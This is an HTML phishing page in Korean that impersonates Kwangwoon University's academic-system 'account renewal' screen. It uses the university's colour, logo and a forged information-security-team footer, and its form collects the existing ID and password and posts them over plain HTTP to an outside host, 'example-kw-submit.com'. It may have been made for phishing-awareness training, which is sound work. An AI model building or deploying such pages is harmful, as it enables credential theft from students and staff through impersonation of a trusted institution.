<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>광운대학교 학사 시스템 계정 갱신</title>
    <style>
        body {
            font-family: '맑은 고딕', Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            box-sizing: border-box;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        .logo {
            width: 120px;
            margin: 0 auto 20px;
        }
        .container h2 {
            color: #3A051F; /* 광운대 메인 컬러 */
            font-weight: bold;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #3A051F; /* 광운대 메인 컬러 */
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        .submit-btn:hover {
            background-color: #290313;
        }
        footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        
        /* 모바일 대응 */
        @media screen and (max-width: 600px) {
            .container {
                padding: 20px;
                max-width: 90%;
            }
            .logo {
                width: 80px;  /* 모바일에서 로고 크기 축소 */
            }
            .submit-btn {
                font-size: 14px;  /* 버튼 텍스트 크기 줄이기 */
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 광운대학교 로고 -->
        <img class="logo" src="kwangwoon_logo.png" alt="광운대학교 로고" style="width: 350px; margin-bottom: 20px;">
        <h2>광운대학교 계정 갱신</h2>
        <form action="http://example-kw-submit.com" method="POST">
            <div class="form-group">
                <label for="username">기존 아이디</label>
                <input type="text" id="username" name="username" placeholder="아이디 입력" required>
            </div>
            <div class="form-group">
                <label for="password">기존 비밀번호</label>
                <input type="password" id="password" name="password" placeholder="비밀번호 입력" required>
            </div>
            <button type="submit" class="submit-btn">계정 변경</button>
        </form>
        <footer>
            &copy; 2024 광운대학교 정보보안팀
        </footer>
    </div>
</body>
</html>
